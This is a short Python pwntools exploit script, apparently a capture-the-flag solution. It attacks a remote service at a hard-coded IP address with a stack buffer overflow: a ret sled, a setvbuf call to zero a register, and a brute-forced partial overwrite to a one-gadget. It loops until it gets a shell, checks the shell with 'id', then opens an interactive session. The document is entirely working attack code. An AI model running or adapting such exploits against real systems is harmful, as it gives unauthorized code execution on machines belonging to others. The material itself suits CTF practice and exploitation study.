from pwn import *

while True:
    # r = process("./attachment/share/gf")
    r = remote("43.201.60.155", 1111)

    ret = 0x40101A
    setvbuf_plt = 0x4011A5
    bss = 0x404000

    oneshot = b"\x3f\x6d\xe7"

    payload = b"\x00" * 8
    payload += b"A" * 8
    payload += p64(bss + 0x800)

    for i in range(19):
        payload += p64(ret)

    payload += p64(setvbuf_plt)  # setvbuf() returns 0 => rax == 0
    payload += oneshot

    r.send(payload)

    try:
        r.sendline(b"id")
        result = r.recvline()
        if b"uid" in result:
            print(result)
            break
    except:
        r.close()

r.interactive()
